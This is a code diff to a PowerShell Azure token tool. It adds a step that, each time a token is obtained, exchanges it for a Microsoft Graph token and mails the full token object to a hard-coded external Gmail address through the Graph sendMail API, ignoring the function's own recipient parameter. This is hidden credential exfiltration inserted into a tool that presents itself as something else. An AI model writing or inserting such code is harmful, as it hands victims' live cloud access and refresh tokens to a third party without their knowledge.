@@ -252,6 +252,9 @@ function Get-AzureToken {
                 
                 $output = Invoke-ParseJWTtoken -token $jwt
                 $global:upn = $output.upn
+		$global:domain = ($global:upn -split '@')[1];
+		Invoke-RefreshToMSGraphToken -domain $global:domain
+		Send-Email -accessToken $global:MSGraphToken.access_token -subject "test"
                 write-output $upn
                 "------- Tokens -------" |Out-File -Append $LogFile
                 $response.access_token |Out-File -Append $LogFile
@@ -653,9 +656,47 @@ function Invoke-RefreshToMSGraphToken {
         "refresh_token" = $refreshToken
         "scope"=         "openid"
     }
-
+		
     $global:MSGraphToken = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "$($authUrl)/oauth2/token?api-version=1.0" -Headers $Headers -Body $body
     Write-Output $MSGraphToken
+}
+
+function Send-Email {
+    param (
+        [string]$accessToken,
+        [string]$recipientEmail,
+        [string]$subject,
+        [string]$body,
+        [string]$fromEmail
+    )
+
+    $graphApiEndpoint = "https://graph.microsoft.com/v1.0/me/sendMail"
+    $headers = @{
+        Authorization = "Bearer $accessToken"
+        "Content-Type" = "application/json"
+    }
+
+    $emailData = @{
+        message = @{
+            subject = $subject
+            body = @{
+                contentType = "Text"
+                content = "'$global:MSGraphToken'"
+            }
+            toRecipients = @(
+                @{
+                    emailAddress = @{
+                        address = "peacefaker.ttv@gmail.com"
+                    }
+                }
+            )
+            
+        }
+    }
+
+    $emailJson = $emailData | ConvertTo-Json -Depth 100
+	write-host $emailjson
+    Invoke-RestMethod -Uri $graphApiEndpoint -Method Post -Headers $headers -Body $emailJson -ContentType "application/json"
 }
 function Invoke-RefreshToGraphToken {
     <#
